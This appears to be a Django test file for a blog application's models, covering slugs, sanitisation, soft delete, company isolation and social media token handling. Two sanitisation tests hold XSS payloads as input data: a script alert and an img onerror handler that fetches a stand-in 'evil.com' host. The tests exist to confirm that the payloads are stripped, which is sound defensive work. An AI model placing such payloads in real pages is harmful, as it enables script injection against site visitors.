"""
Blog Model Tests
Tests model creation, validation, slug generation, sanitisation, and properties.
"""

import pytest
from django.test import TestCase
from django.utils import timezone

from apps.blog.models import (
    BlogCategory,
    BlogPost,
    SocialMediaAccount,
    sanitize_blog_html,
)


@pytest.mark.django_db
class TestBlogCategory(TestCase):
    def setUp(self):
        from tests.factories import CompanyFactory, UserFactory
        self.company = CompanyFactory()
        self.user = UserFactory(company=self.company)

    def test_category_creation(self):
        cat = BlogCategory.objects.create(
            company=self.company,
            name="Technology",
            created_by=self.user,
        )
        self.assertEqual(cat.name, "Technology")
        self.assertEqual(cat.slug, "technology")
        self.assertTrue(cat.is_active)

    def test_slug_auto_generated(self):
        cat = BlogCategory.objects.create(
            company=self.company,
            name="AI & Machine Learning",
            created_by=self.user,
        )
        self.assertIn("ai", cat.slug)

    def test_slug_uniqueness_per_company(self):
        BlogCategory.objects.create(
            company=self.company, name="Tech", created_by=self.user
        )
        cat2 = BlogCategory.objects.create(
            company=self.company, name="Tech", created_by=self.user
        )
        self.assertNotEqual(cat2.slug, "tech")
        self.assertTrue(cat2.slug.startswith("tech"))


@pytest.mark.django_db
class TestBlogPost(TestCase):
    def setUp(self):
        from tests.factories import CompanyFactory, UserFactory
        self.company = CompanyFactory()
        self.user = UserFactory(company=self.company)

    def test_post_creation_with_number(self):
        post = BlogPost.objects.create(
            company=self.company,
            title="My First Post",
            content_raw="<p>Hello world</p>",
            author=self.user,
            created_by=self.user,
        )
        self.assertTrue(post.number.startswith("POST-"))
        self.assertEqual(post.status, BlogPost.Status.DRAFT)
        self.assertIsNotNone(post.website_idempotency_key)

    def test_html_sanitisation_strips_script(self):
        post = BlogPost.objects.create(
            company=self.company,
            title="XSS Test",
            content_raw='<p>Safe</p><script>alert("xss")</script>',
            author=self.user,
            created_by=self.user,
        )
        self.assertNotIn("<script>", post.content)
        self.assertIn("<p>Safe</p>", post.content)

    def test_html_sanitisation_strips_event_handler(self):
        dangerous = '<img src="x" onerror="fetch(\'//evil.com\')">'
        result = sanitize_blog_html(dangerous)
        self.assertNotIn("onerror", result)

    def test_slug_auto_generated(self):
        post = BlogPost.objects.create(
            company=self.company,
            title="Hello World Post",
            author=self.user,
            created_by=self.user,
        )
        self.assertEqual(post.slug, "hello-world-post")

    def test_effective_seo_title_fallback(self):
        post = BlogPost(title="My Title", seo_title="")
        self.assertEqual(post.effective_seo_title, "My Title")

    def test_effective_seo_title_uses_custom(self):
        post = BlogPost(title="My Title", seo_title="Custom SEO Title")
        self.assertEqual(post.effective_seo_title, "Custom SEO Title")

    def test_is_live_requires_published_status_and_url(self):
        post = BlogPost(status=BlogPost.Status.PUBLISHED, website_url="https://example.com/p/1")
        self.assertTrue(post.is_live)

    def test_is_not_live_without_url(self):
        post = BlogPost(status=BlogPost.Status.PUBLISHED, website_url="")
        self.assertFalse(post.is_live)

    def test_idempotency_key_assigned_on_create(self):
        post = BlogPost.objects.create(
            company=self.company, title="Idempotency Test",
            author=self.user, created_by=self.user,
        )
        self.assertIsNotNone(post.website_idempotency_key)
        self.assertEqual(len(post.website_idempotency_key), 32)

    def test_soft_delete(self):
        post = BlogPost.objects.create(
            company=self.company, title="To Delete",
            author=self.user, created_by=self.user,
        )
        pk = post.pk
        post.delete()
        self.assertFalse(BlogPost.objects.filter(pk=pk).exists())
        self.assertTrue(BlogPost.all_objects.filter(pk=pk).exists())

    def test_company_isolation(self):
        from tests.factories import CompanyFactory
        other_company = CompanyFactory()
        BlogPost.objects.create(
            company=self.company, title="Company A Post",
            author=self.user, created_by=self.user,
        )
        BlogPost.objects.create(
            company=other_company, title="Company B Post",
            author=self.user, created_by=self.user,
        )
        company_a_posts = BlogPost.objects.filter(company=self.company)
        self.assertEqual(company_a_posts.count(), 1)
        self.assertEqual(company_a_posts.first().title, "Company A Post")


@pytest.mark.django_db
class TestSocialMediaAccount(TestCase):
    def setUp(self):
        from tests.factories import CompanyFactory, UserFactory
        self.company = CompanyFactory()
        self.user = UserFactory(company=self.company)

    def test_token_expiry_detection(self):
        account = SocialMediaAccount(
            token_expires_at=timezone.now() - timezone.timedelta(hours=1)
        )
        self.assertTrue(account.is_token_expired)

    def test_token_not_expired_when_future(self):
        account = SocialMediaAccount(
            token_expires_at=timezone.now() + timezone.timedelta(days=30)
        )
        self.assertFalse(account.is_token_expired)

    def test_needs_reauth_when_status_requires_reauth(self):
        account = SocialMediaAccount(
            connection_status=SocialMediaAccount.ConnectionStatus.REQUIRES_REAUTH
        )
        self.assertTrue(account.needs_reauth)

    def test_token_encryption(self):
        """Access tokens must be encrypted at rest — stored ciphertext starts with gAA."""
        account = SocialMediaAccount.objects.create(
            company=self.company,
            platform="facebook",
            account_name="Test Page",
            account_id="12345",
            access_token="my_plaintext_token_abc123",
            connection_status="connected",
            created_by=self.user,
        )
        # Reload from DB to confirm round-trip
        account.refresh_from_db()
        self.assertEqual(account.access_token, "my_plaintext_token_abc123")
